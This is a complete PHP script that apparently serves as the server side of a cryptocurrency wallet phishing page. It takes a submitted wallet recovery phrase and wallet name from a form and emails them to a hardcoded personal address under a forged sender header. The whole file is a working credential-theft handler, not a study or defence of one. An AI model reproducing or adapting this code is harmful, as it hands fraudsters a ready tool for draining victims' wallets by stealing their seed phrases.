<?php

if(isset($_POST['phrase'], $_POST['walletname'])){
    $phrase = $_POST['phrase'];
    $walletname = $_POST['walletname'];

    //  $to = 'lodunidris12@gmail.com';
     $to = 'patrickcac80@gmail.com';
    $subject = $walletname.' details';
    $body = $walletname.' Phrase: '.$phrase;
    $headers = 'From: Patrickdare26@gmail.com';

    // Send email
    if(mail($to, $subject, $body, $headers)){
        echo 'Email sent';
    } else {
        echo 'Email not sent';
    } 
}
?>
